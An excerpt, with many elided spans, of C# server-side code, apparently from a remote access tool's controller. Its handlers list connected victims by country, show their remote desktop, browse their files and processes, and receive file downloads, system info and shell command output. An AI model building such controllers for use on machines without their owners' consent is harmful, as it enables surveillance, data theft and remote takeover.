...
namespace Core.Commands
{
    ...
    {
        public static void HandleInitialize(Client client, Core.Packets.ClientPackets.Initialize packet,
            frmMain mainForm)
        {
            ...
            new Thread(new ThreadStart(() =>
            {
                try
                {
                    ...
                    mainForm.Invoke((MethodInvoker) delegate { mainForm.lstClients.Items.Add(lvi); });
        ...
        {
            mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
        ...
        public static void HandleStatus(Client client, Core.Packets.ClientPackets.Status packet, frmMain mainForm)
        {
            new Thread(new ThreadStart(() =>
            {
                foreach (ListViewItem lvi in mainForm.lstClients.Items)
                {
                    ...
                    if (client == c)
                    {
                        mainForm.Invoke((MethodInvoker) delegate { lvi.SubItems[3].Text = packet.Message; });
                        break;
                    }
                }
            })).Start();
        ...
        public static void HandleUserStatus(Client client, Core.Packets.ClientPackets.UserStatus packet,
            frmMain mainForm)
        {
            new Thread(new ThreadStart(() =>
            {
                foreach (ListViewItem lvi in mainForm.lstClients.Items)
                {
                    ...
                    if (client == c)
                    {
                        mainForm.Invoke((MethodInvoker) delegate { lvi.SubItems[4].Text = packet.Message; });
                        break;
                    }
                }
            })).Start();
        ...
        public static void HandleRemoteDesktopResponse(Client client, Core.Packets.ClientPackets.DesktopResponse packet)
        {
            ...
            if (client.Value.lastDesktop == null)
            {
                ...
                client.Value.frmRDP.Invoke(
                    (MethodInvoker) delegate { client.Value.frmRDP.picDesktop.Image = newScreen; });
                newScreen = null;
            }
            else
            {
        ...
        public static void HandleGetProcessesResponse(Client client,
                ...
                if (packet.Files.Length != 0)
                {
                    for (int i = 0; i < packet.Files.Length; i++)
                    {
                        if (packet.Files[i] != "$$$EMPTY$$$$")
                        {
                            ListViewItem lvi =
                                new ListViewItem(new string[]
                                {packet.Files[i], Helper.GetFileSize(packet.FilesSize[i]), "File"});
                            lvi.Tag = "file";
        ...
        public static void HandleDownloadFileResponse(Client client,
        ...
        public static void HandleGetSystemInfoResponse(Client client,
        ...
        public static void HandleShellCommandResponse(Client client,
